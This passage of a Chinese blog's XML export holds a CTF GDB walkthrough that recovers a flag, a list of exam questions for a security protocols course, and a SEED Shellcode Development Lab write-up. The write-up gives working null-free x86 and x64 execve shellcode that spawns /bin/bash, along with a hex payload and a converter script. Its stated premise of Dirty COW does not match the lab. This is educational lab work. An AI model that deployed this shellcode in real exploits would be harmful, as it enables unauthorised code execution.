<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.2.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.3.png" alt="输出结果" /></p>
<h1 id="task-9使用-gdb-转存动态字符串缓冲区"><a class="markdownIt-Anchor" href="#task-9使用-gdb-转存动态字符串缓冲区"></a> Task 9：使用 GDB 转存动态字符串缓冲区</h1>
<p>步骤：</p>
<p>1、输入 gdb ./ctf 进入gbd调试程序。</p>
<p>2、由于 rcx 出现的地址为 0x400dc8，输入 break *0x400dc8 指令设置断点。</p>
<p>3、输入 set env GUESSME=123 指令设置 GUESSME 值为 123，输入 run show_me_the_flag 指令运行该程序，输入 output (char* )rcx 指令获得 rcx 指向的字符串&quot;Crackers Don't Matter&quot;。</p>
<p>4、输入 quit 指令推出 gbd 调试，输入 GUESSME=&quot;Crackers Don't Matter&quot; ./ctf show_me_the_flag 指令获得最终的 flag = 84b34c124b2ba5ca224af8e33b077e9e。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/9.1.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/9.2.png" alt="输出结果" /></p>
]]></content>
      <categories>
        <category>逆向工程与汇编语言</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>test_1</title>
    <url>/posts/362c9816.html</url>
    <content><![CDATA[<h1 id="2023-2024山东大学网络空间安全学院安全协议与标准期末试题"><a class="markdownIt-Anchor" href="#2023-2024山东大学网络空间安全学院安全协议与标准期末试题"></a> 2023-2024山东大学网络空间安全学院《安全协议与标准》期末试题</h1>
<p>能不选就不选啊家人们，太痛苦了</p>
<h2 id="简答题55分"><a class="markdownIt-Anchor" href="#简答题55分"></a> 简答题（5*5分）</h2>
<p>1、简述Diffie-Hellman算法，并描述对其的中间人攻击</p>
<p>2、基于对称密码的单方认证协议</p>
<p>3、简述数字时间戳的生成过程</p>
<p>4、简述CA的三层结构及其功能</p>
<p>5、安全协议的六个安全属性</p>
<h2 id="大题"><a class="markdownIt-Anchor" href="#大题"></a> 大题</h2>
<p>1、描述SSL的握手过程（10）</p>
<p>2、描述girault协议（15）</p>
<p>3、请改进三方的diffie-hellman协议，使其可以抵抗中间人攻击（20）</p>
<p>4、简述KerberosV5协议（15）</p>
<p>5、请写出一个你了解的安全协议，并描述其应用场景（15）</p>
<p>来自：<a href="https://blog.csdn.net/sduwaer/article/details/135412570?spm=1001.2014.3001.5501">原文链接</a></p>
]]></content>
      <categories>
        <category>安全协议与标准</category>
      </categories>
  </entry>
  <entry>
    <title>Shellcode-Development-Lab</title>
    <url>/posts/b73b57f4.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>编写 shellcode。</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>利用 Dirty COW 竞争条件漏洞获得 root 权限。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>SEED 2.0（64位版）虚拟机。</p>
<h1 id="实验任务"><a class="markdownIt-Anchor" href="#实验任务"></a> 实验任务</h1>
<h2 id="task-1编写-shellcode"><a class="markdownIt-Anchor" href="#task-1编写-shellcode"></a> Task 1：编写 Shellcode</h2>
<h3 id="task-1a整个过程"><a class="markdownIt-Anchor" href="#task-1a整个过程"></a> Task 1.a：整个过程</h3>
<p>步骤：</p>
<p>1、编译为目标文件。输入 <code>nasm -f elf32 mysh.s -o mysh.o</code> 指令编译 mysh.s。</p>
<p>2、链接以生成最终的二进制文件。输入 <code>ld -m elf_i386 mysh.o -o mysh</code>指令得到最终的可执行文件 mysh，输入 <code>echo $$</code> 打印出当前 shell 的进程id；输入 mysh 指令运行它，输入<code>echo $$</code> 打印出当前 shell 的进程 id，可以发现它们是不同的，说明 mysh 确实启动了一个新的 shell。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.1.png" alt="命令输出结果" /></p>
<p>3、获取机器码。输入 <code>objdump -Mintel --disassemble mysh.o</code> 获取机器码。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.2.png" alt="获取机器码" /></p>
<p>4、输入 <code>xxd -p -c 20 mysh.o</code> 命令打印出二进制文件的内容。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.3.png" alt="打印二进制文件的内容" /></p>
<p>5、在攻击代码中使用shellcode。由步骤3可知，机器码从31c0开始，到cd80结束。因此截取图3中的这部分二进制内容，复制到 <a href="http://convert.py">convert.py</a> 中的待填写部分中。输入 <code>./convert.py</code> 指令运行该 python 程序，打印出以下可以包含在攻击代码中的 Python 代码。它将 shellcode 存储在一个 Python 数组中。</p>
<p>注：直接输入时发现没有权限，使用管理员权限也不行，因此首先输入 <code>sudo chmod 777 convert.py</code>指令将该文件的权限改为可读可写可执行权限，然后再执行。</p>
<pre><code>#!/usr/bin/env python3

# Run &quot;xxd -p -c 20 rev_sh.o&quot;,
# copy and paste the machine code to the following:
ori_sh =&quot;&quot;&quot;
31c050682f2f7368682f62696e89e3505389e131d231c0b00bcd80
&quot;&quot;&quot;

sh = ori_sh.replace(&quot;\n&quot;, &quot;&quot;)

length  = int(len(sh)/2)
print(&quot;Length of the shellcode: &#123;&#125;&quot;.format(length))
s = 'shellcode= (\n' + '   &quot;'
for i in range(length):
      s += &quot;\\x&quot; + sh[2*i] + sh[2*i+1]
      if i &gt; 0 and i % 16 == 15: 
         s += '&quot;\n' + '   &quot;'
s += '&quot;\n' + &quot;).encode('latin-1')&quot;
print(s)   
</code></pre>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.4.png" alt="convert.py 程序输出的结果" /></p>
<h3 id="task-1b从代码中消除零"><a class="markdownIt-Anchor" href="#task-1b从代码中消除零"></a> Task 1.b：从代码中消除零</h3>
<p>思路：由于我们需要将将使用 shellcode 来执行/bin/bash，这个命令的长度为 9 字节（如果计算末尾的0，则为 10 字节）。在提示1中，我们根据使用 xor eax，eax 指令将 0 赋值给 eax，因为相同的值的异或值为0。因此我们利用这一点将 0 赋值给 eax，并 push eax。在提示3中，我们了解到，如何在机器码中不出现 0x00 的前提下获取一个长度小于4的字符串。因此我们首先将字符串&quot;h###&quot;存储在 ebx 中，然后将其左移 24 位，再右移 24 位，这样就得到了字符串&quot;h&quot;。然后将其 push 到栈中。接着我们分别 push 字符串 /bas 和 /bin，于是我们得到了字符串 /bin/bash0。代码如下：</p>
<pre><code>section .text
   global _start
      _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      mov ebx, &quot;h###&quot;
      shl ebx, 24
      shr ebx, 24
      push ebx
      push &quot;/bas&quot;
      push &quot;/bin&quot;
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points &quot;/bin//sh&quot;
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
</code></pre>
<p>重新生成 nysh.o 文件后，输入 <code>objdump -Mintel --disassemble mysh.o</code> 获取机器码，发现机器码中没有0。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.5.png" alt="获取机器码" /></p>
<p>重新生成 mysh 文件后，输入 <code>mysh</code> 和 <code>echo $$</code> 指令，发现成功打开了一个 bash shell。证明我们的代码成功执行了。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.6.png" alt="运行结果" /></p>
<h3 id="task-1c为系统调用提供参数"><a class="markdownIt-Anchor" href="#task-1c为系统调用提供参数"></a> Task 1.c：为系统调用提供参数</h3>
<p>思路：多次利用提示3的内容，按顺序push &quot;/bin//sh&quot;、&quot;-c&quot;、&quot;ls -la&quot;、&quot;0&quot;。</p>
<pre><code>section .text
   global _start
      _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push &quot;//sh&quot;
      push &quot;/bin&quot;
      mov  ebx, esp     ; Get the string address
      
      mov  ecx, &quot;la##&quot;
      shl ecx, 16
      shr ecx, 16
      push ecx
      push &quot;ls -&quot;
      mov  ecx, esp
      
      mov  edx, &quot;-c##&quot;
      shl edx, 16
      shr edx, 16
      push edx
      mov  edx, esp

      ; Construct the argument array argv[]
      push eax          ; argv[3] = 0
      push ecx          ; argv[2] = &quot;ls -la&quot;
      push edx          ; argv[1] = &quot;-c&quot;
      push ebx          ; argv[0] points &quot;/bin//sh&quot;
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
</code></pre>
<p>重新生成 mysh.o文件后，输入 <code>objdump -Mintel --disassemble mysh.o</code> 获取机器码，发现机器码中没有0。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.8.png" alt="获取机器码" /></p>
<p>重新生成 mysh 文件后，输入 <code>mysh</code> 指令，发现成功执行了 ls -la 的指令，代码编写成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.7.png" alt="运行结果" /></p>
<h3 id="task-1d为系统调用提供参数"><a class="markdownIt-Anchor" href="#task-1d为系统调用提供参数"></a> Task 1.d：为系统调用提供参数</h3>
<p>思路：多次利用提示3的内容，首先 push 需要打印的内容，然后 push 环境变量 &quot;/usr/bin/env&quot;。</p>
<pre><code>section .text
   global _start
      _start:
         ; Store the argument string on stack
         xor  eax, eax 
         push eax          ; Use 0 to terminate the string
         mov  ebx, &quot;4###&quot;
         shl ebx, 24
         shr ebx, 24
         push ebx
         push &quot;=123&quot;
         push &quot;cccc&quot; 
         mov  ebx, esp     ; Get the string address

         xor  eax, eax
         push eax
         push &quot;5678&quot;
         push &quot;bbb=&quot;
         mov  ecx, esp
         
         xor  eax, eax
         push eax
         push &quot;1234&quot;
         push &quot;aaa=&quot;
         mov  edx, esp         

         ; Construct the argument array argv[]
         push eax          ; env[3] = 0 // 0 marks the end of the array
         push ebx          ; env[2] = address to the &quot;cccc=1234&quot; string
         push ecx          ; env[1] = address to the &quot;bbb=5678&quot; string
         push edx          ; env[0] = address to the &quot;aaa=1234&quot; string
         mov  edx, esp     ; Get the address of argv[]
      
         ; For environment variable 
         xor  eax, eax     ; No env variables 
         push eax
         push &quot;/env&quot;
         push &quot;/bin&quot;
         push &quot;/usr&quot;
         mov  ebx, esp
         
         push eax
         push ebx
         mov  ecx, esp

         ; Invoke execve()
         xor  eax, eax     ; eax = 0x00000000
         mov   al, 0x0b    ; eax = 0x0000000b
         int 0x80
</code></pre>
<p>生成 myenv.o文件后，输入 <code>objdump -Mintel --disassemble myenv.o</code> 获取机器码，发现机器码中没有0。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.10.png" alt="获取机器码" /></p>
<p>生成 myenv 文件后，输入 <code>myenv</code> 指令，发现成功生成了要求内容，代码编写成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/1.9.png" alt="运行结果" /></p>
<h2 id="task-2使用代码段"><a class="markdownIt-Anchor" href="#task-2使用代码段"></a> Task 2：使用代码段</h2>
<p>1、从标记为 one 的那一行开始，请提供 mysh2.s 中每一行代码的详细说明。请解释为什么这段代码会成功地执行/bin/sh 程序，argv[] 数组是如何构造的，等等。</p>
<pre><code>section .text
   global _start
      _start:
   BITS 32
   jmp short two
      one:                      ;设置函数 one 的起始位置。
   pop ebx                      ;将栈顶 pop 到 ebx 中。
   xor eax, eax                 ;使 eax 与自己异或，从而将 0 赋值到 eax。
   mov [ebx+7], al              ;将 ebx 的第7个数变由&quot;*&quot;变为&quot;0&quot;;
   mov [ebx+8], ebx             ;将 ebx 的地址存储到 ebx+8 的位置，覆盖 &quot;AAAA&quot;。
   mov [ebx+12], eax            ;将 eax 的值存储到 ebx+12 的位置，覆盖 &quot;BBBB&quot;。
   lea ecx, [ebx+8]             ;将 ebx+8 的值存储到 ecx。
   xor edx, edx                 ;使 ebx 与自己异或，从而将 0 赋值到 ebx。
   mov al,  0x0b                ;execve()系统调用的编号。
   int 0x80                     ;系统中断命令
      two:
   call one
   db '/bin/sh*AAAABBBB'
</code></pre>
<p>2、请使用 mysh2.s 给出的构造技术来实现一个新的 shellcode，用它执行/usr/bin/env，并打印出以下环境变量：a=11 b=22</p>
<p>思路：首先我们发现，只需输入 /usr/bin/env - a=11 b=22 命令即可实现要求。于是我们首先在函数 two 中将 db 的值更改为&quot;/usr/bin/env*-*a=11*b=22*AAAABBBBCCCCDDDDEEEE&quot;，然后我们需要将其中的&quot;*&quot;变成&quot;0&quot;，接着在&quot;AAAA&quot;中存储&quot;env&quot;，在&quot;BBBB&quot;中存储&quot;-*&quot;，在&quot;CCCC&quot;中存储&quot;a=11&quot;，在&quot;DDDD&quot;中存储&quot;b=22&quot;，在&quot;EEEE&quot;中存储&quot;0&quot;。代码如下：</p>
<pre><code>section .text
   global _start
      _start:
   BITS 32
   jmp short two
      one:
   pop ebx
   xor eax, eax
   mov [ebx+12], al
   mov [ebx+14], al
   mov [ebx+19], al
   mov [ebx+24], al

   lea edx, [ebx+0]
   mov [ebx+25], edx
   lea edx, [ebx+13]
   mov [ebx+29], edx
   lea edx, [ebx+15]
   mov [ebx+33], edx
   lea edx, [ebx+20]
   mov [ebx+37], edx
   mov [ebx+41], eax

   lea ecx, [ebx+25] 
   xor edx, edx
   mov al,  0x0b
   int 0x80
      two:
   call one
   db '/usr/bin/env*-*a=11*b=22*AAAABBBBCCCCDDDDEEEE'
</code></pre>
<p>生成 mysh2.o文件后，输入 <code>objdump -Mintel --disassemble mysh2.o</code>获取机器码，发现机器码中没有0。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.2.png" alt="函数 one 的机器码" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.3.png" alt="函数 two 的机器码" /></p>
<p>生成 mysh2 文件后，输入 mysh2<br />
指令，发现成功生成了要求内容，代码编写成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.1.png" alt="运行结果" /></p>
<h2 id="task-3编写-64-位-shellcode"><a class="markdownIt-Anchor" href="#task-3编写-64-位-shellcode"></a> Task 3：编写 64 位 shellcode</h2>
<p>思路：与 Task1.b 类似，但由于是 64 位 shellcode，因此每个数都必须是 8 的倍数。因此我们将字符串 &quot;h########&quot; 存储在 rax 中，然后将其左移 56 位，再右移 56 位，这样就得到了字符串 h。然后将其 push 到栈中。接着我们 push 字符串 &quot;/bas/bin&quot;，于是我们得到了字符串 /bin/bash0。代码如下：</p>
<pre><code>section .text
   global _start
      _start:
      ; The following code calls execve(&quot;/bin/sh&quot;, ...)
      xor  rdx, rdx       ; 3rd argument
      push rdx
      mov rax,'h#######'
      shl rax, 56
      shr rax, 56
      push rax 
      mov rbx,'/bin/bas'
      push rbx 
      mov rdi, rsp        ; 1st argument
      push rdx 
      push rdi
      mov rsi, rsp        ; 2nd argument
      xor  rax, rax
      mov al, 0x3b        ; execve()
      syscall
</code></pre>
<p>生成 mysh_64.o文件后，输入 <code>objdump -Mintel --disassemble mysh_64.o</code>获取机器码，发现机器码中没有0。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/3.2.png" alt="获取机器码" /></p>
<p>生成 mysh_64 文件后，输入 <code>mysh_64</code>指令，发现成功生成了要求内容，代码编写成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/3.1.png" alt="运行结果" /></p>
<h1 id="代码附录"><a class="markdownIt-Anchor" href="#代码附录"></a> 代码附录</h1>
<h2 id="task-1b"><a class="markdownIt-Anchor" href="#task-1b"></a> Task 1.b</h2>
<pre><code>section .text
   global _start
      _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      mov ebx, &quot;h###&quot;
      shl ebx, 24
      shr ebx, 24
      push ebx
      push &quot;/bas&quot;
      push &quot;/bin&quot;
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points &quot;/bin//sh&quot;
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
</code></pre>
<h2 id="task-1c"><a class="markdownIt-Anchor" href="#task-1c"></a> Task 1.c</h2>
<pre><code>section .text
   global _start
      _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push &quot;//sh&quot;
      push &quot;/bin&quot;
      mov  ebx, esp     ; Get the string address
      
      mov  ecx, &quot;la##&quot;
      shl ecx, 16
      shr ecx, 16
      push ecx
      push &quot;ls -&quot;
      mov  ecx, esp
      
      mov  edx, &quot;-c##&quot;
      shl edx, 16
      shr edx, 16
      push edx
      mov  edx, esp

      ; Construct the argument array argv[]
      push eax          ; argv[3] = 0
      push ecx          ; argv[2] = &quot;ls -la&quot;
      push edx          ; argv[1] = &quot;-c&quot;
      push ebx          ; argv[0] points &quot;/bin//sh&quot;
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
</code></pre>
<h2 id="task-1d"><a class="markdownIt-Anchor" href="#task-1d"></a> Task 1.d</h2>
<pre><code>section .text
   global _start
      _start:
         ; Store the argument string on stack
         xor  eax, eax 
         push eax          ; Use 0 to terminate the string
         mov  ebx, &quot;4###&quot;
         shl ebx, 24
         shr ebx, 24
         push ebx
         push &quot;=123&quot;
         push &quot;cccc&quot; 
         mov  ebx, esp     ; Get the string address

         xor  eax, eax
         push eax
         push &quot;5678&quot;
         push &quot;bbb=&quot;
         mov  ecx, esp
         
         xor  eax, eax
         push eax
         push &quot;1234&quot;
         push &quot;aaa=&quot;
         mov  edx, esp         

         ; Construct the argument array argv[]
         push eax          ; env[3] = 0 // 0 marks the end of the array
         push ebx          ; env[2] = address to the &quot;cccc=1234&quot; string
         push ecx          ; env[1] = address to the &quot;bbb=5678&quot; string
         push edx          ; env[0] = address to the &quot;aaa=1234&quot; string
         mov  edx, esp     ; Get the address of argv[]
      
         ; For environment variable 
         xor  eax, eax     ; No env variables 
         push eax
         push &quot;/env&quot;
         push &quot;/bin&quot;
         push &quot;/usr&quot;
         mov  ebx, esp
         
         push eax
         push ebx
         mov  ecx, esp

         ; Invoke execve()
         xor  eax, eax     ; eax = 0x00000000
         mov   al, 0x0b    ; eax = 0x0000000b
         int 0x80
</code></pre>
<h2 id="task-2"><a class="markdownIt-Anchor" href="#task-2"></a> Task 2</h2>
<pre><code>section .text
   global _start
      _start:
   BITS 32
   jmp short two
      one:
   pop ebx
   xor eax, eax
   mov [ebx+12], al
   mov [ebx+14], al
   mov [ebx+19], al
   mov [ebx+24], al

   lea edx, [ebx+0]
   mov [ebx+25], edx
   lea edx, [ebx+13]
   mov [ebx+29], edx
   lea edx, [ebx+15]
   mov [ebx+33], edx
   lea edx, [ebx+20]
   mov [ebx+37], edx
   mov [ebx+41], eax

   lea ecx, [ebx+25] 
   xor edx, edx
   mov al,  0x0b
   int 0x80
      two:
   call one
   db '/usr/bin/env*-*a=11*b=22*AAAABBBBCCCCDDDDEEEE'
</code></pre>
<h2 id="task-3"><a class="markdownIt-Anchor" href="#task-3"></a> Task 3</h2>
<pre><code>section .text
   global _start
      _start:
      ; The following code calls execve(&quot;/bin/sh&quot;, ...)
      xor  rdx, rdx       ; 3rd argument
      push rdx
      mov rax,'h#######'
      shl rax, 56
      shr rax, 56
      push rax 
      mov rbx,'/bin/bas'
      push rbx 
      mov rdi, rsp        ; 1st argument
      push rdx 
      push rdi
      mov rsi, rsp        ; 2nd argument
      xor  rax, rax
      mov al, 0x3b        ; execve()
      syscall
</code></pre>
]]></content>
      <categories>
        <category>逆向工程与汇编语言</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
